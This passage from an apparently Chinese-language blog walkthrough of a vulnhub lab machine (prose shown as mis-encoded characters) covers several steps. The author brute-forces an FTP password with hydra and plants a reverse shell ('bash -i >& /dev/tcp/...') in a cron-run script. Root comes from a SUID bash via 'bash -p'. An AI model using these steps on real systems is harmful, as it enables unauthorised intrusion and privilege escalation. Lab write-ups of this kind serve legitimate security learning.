class="built_in">files</span>.</span><br><span class="line"><span class="keyword">ftp</span>&gt; ls</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">8782</span>|)</span><br><span class="line"><span class="number">150</span> Opening ASCII mode data connection <span class="keyword">for</span> <span class="built_in">file</span> list</span><br><span class="line">-rw-r<span class="comment">--r--   1 ftp      ftp           169 Jun  5  2021 welcome.msg</span></span><br><span class="line"><span class="number">226</span> Transfer complete</span><br><span class="line"><span class="keyword">ftp</span>&gt; <span class="built_in">get</span> welcome.msg</span><br><span class="line"><span class="built_in">local</span>: welcome.msg remote: welcome.msg</span><br><span class="line"><span class="number">229</span> Entering Extended Passive Mode (|||<span class="number">51553</span>|)</span><br><span class="line"><span class="number">150</span> Opening BINARY mode data connection <span class="keyword">for</span> welcome.msg (<span class="number">169</span> <span class="keyword">bytes</span>)</span><br><span class="line"><span class="number">100</span>% |********************************************************************|   <span class="number">169</span>       <span class="number">31.01</span> KiB/s    <span class="number">00</span>:<span class="number">00</span> ETA</span><br><span class="line"><span class="number">226</span> Transfer complete</span><br><span class="line"><span class="number">169</span> <span class="keyword">bytes</span> received <span class="keyword">in</span> <span class="number">00</span>:<span class="number">00</span> (<span class="number">14.47</span> KiB/s)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cat welcome.msg                                  </span><br><span class="line">Welcome, archive <span class="keyword">user</span> %U@%R !</span><br><span class="line"></span><br><span class="line">The <span class="keyword">local</span> <span class="type">time</span> <span class="keyword">is</span>: %T</span><br><span class="line"></span><br><span class="line">This <span class="keyword">is</span> an experimental FTP <span class="keyword">server</span>.  <span class="keyword">If</span> you have <span class="keyword">any</span> unusual problems,</span><br><span class="line">please report them via e-mail <span class="keyword">to</span> &lt;sky@%L&gt;.</span><br></pre></td></tr></table></figure></div>
<p>è¿™å‡ºç°äº†ä¸¤ä¸ªç–‘ä¼¼ç”¨æˆ·çš„ä¸œè¥¿ï¼Œå°è¯•ftpç™»å½•çœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ftp <span class="variable">%U</span>@<span class="variable">%R</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>    </span><br><span class="line"><span class="symbol">ftp:</span> Can&#x27;t lookup `<span class="variable">%R</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>:ftp&#x27;: Name <span class="keyword">or</span> service not known</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ftp user<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span> </span><br><span class="line">Connected <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">179.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e Server (Debian) [::ffff:<span class="number">192.168</span>.<span class="number">179.139</span>]</span><br><span class="line"><span class="number">331</span> Password required for user</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ftp sky@<span class="variable">%L</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span></span><br><span class="line"><span class="symbol">ftp:</span> Can&#x27;t lookup `<span class="variable">%L</span><span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>:ftp&#x27;: Name <span class="keyword">or</span> service not known</span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ftp sky<span class="title">@192</span>.<span class="number">168.179</span>.<span class="number">139</span>    </span><br><span class="line">Connected <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">179.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e Server (Debian) [::ffff:<span class="number">192.168</span>.<span class="number">179.139</span>]</span><br><span class="line"><span class="number">331</span> Password required for sky</span><br><span class="line">Password: </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å°è¯•ä¸€ä¸‹ï¼Œå‘ç°å¯èƒ½æœ‰user å’Œ skyç”¨æˆ·ï¼Œç”¨hydraçˆ†ç ´ä¸€ä¸‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# hydra -l sky -P /usr/<span class="keyword">share</span>/wordlists/rockyou.txt ftp://<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span> </span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> <span class="keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="keyword">do</span> <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span><span class="number">-02</span><span class="number">-09</span> <span class="number">18</span>:<span class="number">40</span>:<span class="number">46</span></span><br><span class="line">[DATA] max <span class="number">16</span> tasks per <span class="number">1</span> <span class="keyword">server</span>, overall <span class="number">16</span> tasks, <span class="number">14344399</span> <span class="keyword">login</span> tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">896525</span> tries per task</span><br><span class="line">[DATA] attacking ftp://<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>:<span class="number">21</span>/</span><br><span class="line">[STATUS] <span class="number">295.00</span> tries/min, <span class="number">295</span> tries <span class="keyword">in</span> <span class="number">00</span>:<span class="number">01</span>h, <span class="number">14344106</span> <span class="keyword">to</span> <span class="keyword">do</span> <span class="keyword">in</span> <span class="number">810</span>:<span class="number">25</span>h, <span class="number">14</span> active</span><br><span class="line">[<span class="number">21</span>][ftp] host: <span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>   <span class="keyword">login</span>: sky   <span class="keyword">password</span>: thebest</span><br><span class="line"><span class="number">1</span> <span class="keyword">of</span> <span class="number">1</span> target successfully completed, <span class="number">1</span> <span class="keyword">valid</span> <span class="keyword">password</span> <span class="built_in">found</span></span><br><span class="line">[<span class="built_in">WARNING</span>] Writing restore file because <span class="number">2</span> final worker threads did <span class="keyword">not</span> complete <span class="keyword">until</span> <span class="keyword">end</span>.</span><br><span class="line">[ERROR] <span class="number">2</span> targets did <span class="keyword">not</span> resolve <span class="keyword">or</span> could <span class="keyword">not</span> be connected</span><br><span class="line">[ERROR] <span class="number">0</span> target did <span class="keyword">not</span> complete</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="number">2025</span><span class="number">-02</span><span class="number">-09</span> <span class="number">18</span>:<span class="number">43</span>:<span class="number">31</span></span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸå¾—åˆ°skyç”¨æˆ·çš„å¯†ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">drwxr-xr-x  <span class="number"> 3 </span>sky      sky         <span class="number"> 4096 </span>Jun <span class="number"> 6 </span><span class="number"> 2021 </span>.</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky           <span class="number"> 56 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 220 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_logout</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky         <span class="number"> 3771 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bashrc</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 807 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.profile</span><br><span class="line">drwxr-----  <span class="number"> 2 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">-rwxr-x---  <span class="number"> 1 </span>sky      sarah         <span class="number"> 66 </span>Jun <span class="number"> 6 </span><span class="number"> 2021 </span>user.flag</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky         <span class="number"> 1489 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.viminfo</span><br><span class="line">226 Transfer complete</span><br><span class="line">ftp&gt; cat user.flag</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; get user.flag</span><br><span class="line">local: user.flag remote: user.flag</span><br><span class="line">229 Entering Extended Passive Mode (|||8837|)</span><br><span class="line">150 Opening BINARY mode data connection for user.flag (66 bytes)</span><br><span class="line">100% |********************************************************************|   <span class="number"> 66 </span>       1.67 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br></pre></td></tr></table></figure></div>
<p>æœ‰ä¸ªuserflagï¼Œè€Œä¸”è¿™ä¸ªsarahæ˜¯ç»„æˆå‘˜ï¼Œçœ‹çœ‹user flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="D"><figure class="iseeu highlight /d"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cat user.flag                                    </span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">echo <span class="string">&quot;Your flag is:88jjggzzZhjJjkOIiu76TggHjoOIZTDsDSd&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªflagä¸æ˜¯base64ï¼Œä½†æ˜¯è¿™ä¸ªuser.flagä¸æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æœ¬ï¼Œå®ƒæ˜¯ä¸€ä¸ªshè„šæœ¬<br>æ‰€ä»¥è‚¯å®šè¦ç”¨è¿™ä¸ªæ–‡ä»¶,æˆ‘ç°åœ¨æ¥è§¦çš„shè„šæœ¬è‡ªå·±ç”¨çš„åªæœ‰ç”¨æ¥åå¼¹shell,é‚£æˆ‘ä»¬å°±åœ¨ftpä¸­ä¸Šä¼ åå¼¹shellè„šæœ¬</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# cat reverse.sh </span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.179.83/1234 0&gt;&amp;1</span><br><span class="line">ftp&gt; put reverse.sh</span><br><span class="line">local: reverse.sh remote: reverse.sh</span><br><span class="line">229 Entering Extended Passive Mode (|||58762|)</span><br><span class="line">150 Opening BINARY mode data connection for reverse.sh</span><br><span class="line">100% |<span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span>|    45      255.49 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br><span class="line">45 bytes sent in 00:00 (6.58 KiB/s)</span><br><span class="line">ftp&gt; mv reverse.sh user.flag</span><br><span class="line">?Invalid command.</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°åœ¨ftpä¸­æ²¡æ³•é‡å‘½åï¼Œæˆ‘ä»¬å°±åœ¨æœ¬æœºæ”¹åä¸Šä¼ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># cat user.flag </span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.179.83/1234 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">ftp&gt; put user.flag</span><br><span class="line">local: user.flag remote: user.flag</span><br><span class="line">229 Entering Extended Passive Mode (|||34801|)</span><br><span class="line">150 Opening BINARY mode data connection for user.flag</span><br><span class="line">100% |********************************************************************|   <span class="number"> 55 </span>     383.64 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete</span><br><span class="line">55 bytes sent in 00:00 (5.41 KiB/s)</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||62805|)</span><br><span class="line">150 Opening ASCII mode data connection for file list</span><br><span class="line">drwxr-xr-x  <span class="number"> 3 </span>sky      sky         <span class="number"> 4096 </span>Feb <span class="number"> 9 </span>11:04 .</span><br><span class="line">drwxr-xr-x  <span class="number"> 5 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>..</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky           <span class="number"> 56 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_history</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 220 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bash_logout</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky         <span class="number"> 3771 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.bashrc</span><br><span class="line">-r--r--r--  <span class="number"> 1 </span>sky      sky          <span class="number"> 807 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.profile</span><br><span class="line">-rw-r--r--  <span class="number"> 1 </span>sky      sky           <span class="number"> 45 </span>Feb <span class="number"> 9 </span>11:04 reverse.sh</span><br><span class="line">drwxr-----  <span class="number"> 2 </span>root     root        <span class="number"> 4096 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.ssh</span><br><span class="line">-rwxr-x---  <span class="number"> 1 </span>sky      sarah         <span class="number"> 55 </span>Feb <span class="number"> 9 </span>11:06 user.flag</span><br><span class="line">-rw-------  <span class="number"> 1 </span>sky      sky         <span class="number"> 1489 </span>Jun <span class="number"> 5 </span><span class="number"> 2021 </span>.viminfo</span><br><span class="line">226 Transfer complete</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸä¸Šä¼ ï¼Œç„¶ååœ¨æœ¬åœ°ç›‘å¬ï¼Œå¾—åˆ°shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234          </span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process<span class="built_in"> group </span>(-1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="literal">no</span> job control <span class="keyword">in</span> this shell</span><br><span class="line">bash-4.4$ id</span><br><span class="line"><span class="attribute">uid</span>=1002(sarah) <span class="attribute">gid</span>=1002(sarah) <span class="attribute">groups</span>=1002(sarah)</span><br><span class="line">bash-4.4$ </span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>åœ¨è¿™é‡Œæˆ‘å¡äº†å¾ˆä¹…ã€‚<br>å…ˆçœ‹äº†ä¸€ä¸‹sudoï¼Œä½†æ˜¯sudoè¦å¯†ç <br>å†æŸ¥ä¸€ä¸‹suidï¼Œæˆ‘çœ‹è¿™é‡Œéƒ½æ˜¯&#x2F;binç›®å½•ä¸‹çš„ï¼Œéšä¾¿é€‰äº†å‡ ä¸ªå»gtfobinsæœäº†ä¸€ä¸‹å°±æ²¡ç®¡äº†<br>æˆ‘çš„æ€è·¯æ˜¯é¦–å…ˆå…ˆç”¨pspy64çœ‹ä¸€ä¸‹å®šæ—¶ä»»åŠ¡<br>æˆ‘å‘ç°äº†è¿™user.flagæ˜¯ä¸€ä¸ªå®šæ—¶ç¨‹åº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">19</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2</span>      | </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">04</span>:<span class="number">19</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1</span>      | /sbin/init maybe-ubiquity </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">27586</span>  | bash -i /home/sky/user.flag </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">1002</span>  PID=<span class="number">27585</span>  | /bin/sh -c bash -i /home/sky/user.flag &gt; /dev/null </span><br><span class="line"><span class="attribute">2025</span>/<span class="number">02</span>/<span class="number">09</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">27584</span>  | /usr/sbin/CRON -f </span><br></pre></td></tr></table></figure></div>
<p>æˆ‘å°±æƒ³ç€æ˜¯è¿™ä¸ªå®šæ—¶ä»»åŠ¡é‡Œé¢æœ‰uid&#x3D;0çš„ï¼Œè€Œä¸”æ‰§è¡Œäº†bash -i &#x2F;home&#x2F;sky&#x2F;user.flag<br>è¿™éš¾é“æ˜¯rootä¹Ÿä¼šæ‰§è¡Œè¿™ä¸ªå®šæ—¶ä»»åŠ¡ï¼Ÿä¸‹é¢æ˜¯sarahæ‰§è¡Œçš„è¿™ä¸ªä»»åŠ¡ï¼Œæˆ‘æ‹¿åˆ°äº†sarahçš„shell<br>ä½†æ˜¯æˆ‘åœ¨kalié‡Œé¢nc -lp 1234 äº†å¥½å‡ éï¼Œéƒ½æ˜¯è¿”å›sarahçš„shellã€‚<br>åé¢ç»è¿‡ç¾¤ä¸»æé†’ï¼Œè¿™ä¸ªbashçš„PS1æœ‰é—®é¢˜<br>åœ¨ Linux ä¸­ï¼ŒPS1ï¼ˆPrompt String 1ï¼‰æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨æ¥å®šä¹‰ shell å‘½ä»¤æç¤ºç¬¦çš„æ˜¾ç¤ºå†…å®¹å’Œæ ¼å¼ã€‚ä¸€èˆ¬æ™®é€šç”¨æˆ·çš„PS1ä»¥$ç»“å°¾ï¼Œrootçš„ä»¥#ç»“å°¾<br>åœ¨è¿™ä¸ªé¶æœºä¸­çš„PS1æ˜¯<code>bash-4.2$</code>ï¼Œæ²¡æœ‰æ˜¾ç¤ºè·¯å¾„ï¼Œç”¨æˆ·åï¼Œè¯´æ˜æ˜¯ä¸€ä¸ªå—é™çš„bash<br>æ‰€ä»¥ç”¨<code>bash -p</code>è¿™ä¸ªæŒ‡ä»¤å°±å¯ä»¥å¾—åˆ°rootçš„shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">^X-su-<span class="number">4.4</span><span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/bin/bash</span></span><br><span class="line"><span class="regexp">/bin/su</span></span><br><span class="line"><span class="regexp">/bin/fusermount</span></span><br><span class="line"><span class="regexp">/bin/ping</span></span><br><span class="line"><span class="regexp">/bin/mount</span></span><br><span class="line"><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/traceroute</span>6.iputils</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/procmail</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgidmap</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/newuidmap</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/pkexec</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/passwd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/eject</span><span class="regexp">/dmcrypt-get-device</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/snapd</span><span class="regexp">/snap-confine</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/lib/policykit</span>-<span class="number">1</span>/polkit-agent-helper-<span class="number">1</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/x86_64-linux-gnu/lxc</span><span class="regexp">/lxc-user-nic</span></span><br><span class="line"><span class="regexp">-su-4.4$ /bin</span><span class="regexp">/bash</span></span><br><span class="line"><span class="regexp">bash-4.4$ bash -p</span></span><br><span class="line"><span class="regexp">bash-4.4# id</span></span><br><span class="line"><span class="regexp">uid=1002(sarah) gid=1002(sarah) euid=0(root) egid=0(root) groups=0(root),1002(sarah)</span></span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥è¿™ä¸ª&#x2F;bin&#x2F;bashæœ‰suidæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼Œæˆ‘ç›´æ¥å¿½ç•¥äº†ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">-pï¼ˆprivileged modeï¼Œç‰¹æƒæ¨¡å¼ï¼‰ï¼š</span><br><span class="line">é»˜è®¤æƒ…å†µä¸‹ï¼ŒBash åœ¨ä»¥ SUIDï¼ˆ<span class="keyword">Set</span>-User-IDï¼‰æˆ– SGIDï¼ˆ<span class="keyword">Set</span>-Group-IDï¼‰æ–¹å¼æ‰§è¡Œæ—¶ï¼Œä¼šè‡ªåŠ¨ä¸¢å¼ƒ euid å¹¶é™æƒåˆ° <span class="comment">ruid</span> ä»¥é¿å…å®‰å…¨é—®é¢˜ã€‚</span><br><span class="line">ä½†æ˜¯ï¼Œä½¿ç”¨ bash <span class="comment">-p</span> å¯ä»¥å°è¯•ä¿ç•™ <span class="comment">euid</span>ï¼Œä»è€Œç»§ç»­ä»¥æå‡çš„æƒé™è¿è¡Œ <span class="comment">Bash</span>ï¼ˆå¦‚æœç³»ç»Ÿå…è®¸ï¼‰ã€‚</span><br></pre></td></tr></table></figure></div>
<p>å¦å¤–åˆšæ‰é‚£ä¸ªå®šæ—¶ä»»åŠ¡ä¸ºä»€ä¹ˆæœ‰rootçš„èº«ä»½æ‰§è¡Œçš„è¡Œå‘¢ï¼Ÿ åŸå› æ˜¯è¿™æ ·çš„ï¼šå¦‚æœæ‹¿apacheæœåŠ¡ä¸¾ä¾‹ï¼Œå‘ç°è¿è¡Œè¿™ä¸ªæœåŠ¡çš„ä¸æ­¢æœ‰www-dataçš„è¿˜æœ‰rootï¼Œä¸ºä»€ä¹ˆæ¯æ¬¡æ‹¿åˆ°çš„shelléƒ½æ˜¯www-dataçš„å‘¢ï¼Ÿå› ä¸ºrootåªæ˜¯è´Ÿè´£æœåŠ¡çš„åˆå§‹åŒ–ç­‰å†…å®¹ï¼Œè¿™ä¸ªæœåŠ¡è¿˜æ˜¯å½’www-dataæ‰€æœ‰çš„ã€‚<br>åœ¨è¿™é‡Œä¹Ÿæ˜¯ï¼Œè¿™ä¸ªuser.flagæ–‡ä»¶å°±æ˜¯ç”±sarahç”¨æˆ·æ‰§è¡Œçš„ã€‚<br>ç°åœ¨æˆ‘ä»¬åœ¨rootçš„èº«ä»½ä¸‹å¯ä»¥å»å®šæ—¶ä»»åŠ¡é‡Œé¢çœ‹çœ‹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">bash-<span class="number">4.4</span><span class="comment"># pwd       </span></span><br><span class="line"><span class="regexp">/var/</span>spool<span class="regexp">/cron/</span>crontabs</span><br><span class="line">bash-<span class="number">4.4</span><span class="comment"># ls</span></span><br><span class="line">sarah</span><br><span class="line">bash-<span class="number">4.4</span><span class="comment"># cat sarah </span></span><br><span class="line"><span class="comment"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span></span><br><span class="line"><span class="comment"># (/tmp/crontab.A5TLWA/crontab installed on Sun Jun  6 13:52:29 2021)</span></span><br><span class="line"><span class="comment"># (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span></span><br><span class="line">*<span class="regexp">/1	*	*	*	*	bash -i /</span>home<span class="regexp">/sky/u</span>ser.flag &gt; <span class="regexp">/dev/</span>null</span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥è¿™ä¸ªä»»åŠ¡å°±æ˜¯åªæœ‰sarahè¿™ä¸ªç”¨æˆ·æ‰§è¡Œçš„ã€‚<br>æœ€åæˆ‘è¿˜ä»ç¾¤ä¸»ll104567é‚£å­¦åˆ°äº†ä¸€ä¸ªä¸œè¥¿ï¼Œæˆ‘ä¸€ç›´éƒ½ä¸çŸ¥é“ï¼Œå«<code>linpeas.sh</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">linPEAS</span> æ˜¯ä¸€ä¸ªç”¨äº Linux ç³»ç»Ÿçš„ç‰¹æƒæå‡è„šæœ¬å¥—ä»¶ï¼Œæ—¨åœ¨å¸®åŠ©è¿›è¡Œåæ¸—é€æµ‹è¯•æ—¶è¿›è¡Œç³»ç»Ÿæšä¸¾å’Œå‘ç°ç‰¹æƒæå‡è·¯å¾„ã€‚ ç³»ç»Ÿæšä¸¾ï¼šlinPEAS æ”¶é›†ç³»ç»Ÿçš„å¹¿æ³›ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ã€ç»„ã€è¿›ç¨‹ã€ç½‘ç»œé…ç½®ã€å®‰è£…çš„è½¯ä»¶ç­‰ã€‚ ç‰¹æƒæå‡æ£€æµ‹ï¼šå®ƒæ£€æŸ¥å¸¸è§çš„é…ç½®é”™è¯¯å’Œæ¼æ´ï¼Œè¿™äº›æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…åœ¨ç³»ç»Ÿä¸Šæå‡å…¶æƒé™ã€‚</span><br></pre></td></tr></table></figure></div>
<p>è¿è¡Œè¿™ä¸ªç¨‹åºä¹‹åä¹Ÿèƒ½å‘ç°bashæœ‰å¯ä»¥ææƒçš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">6(CVE-2011-1485)</span><br><span class="line">-rwsr-sr-x<span class="number"> 1 </span>root   root       1.1M Jun <span class="number"> 6 </span><span class="number"> 2019 </span>/bin/bash</span><br><span class="line">-rwsr-xr-x<span class="number"> 1 </span>root   root        19K Jun<span class="number"> 28 </span><span class="number"> 2019 </span>/usr/bin/traceroute6.iputils</span><br></pre></td></tr></table></figure></div>
<p>è¿è¡Œç¨‹åºä¹‹åè¿™ä¸ª&#x2F;bin&#x2F;bashæ˜¯é»„åº•çº¢è‰²çš„ã€‚</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
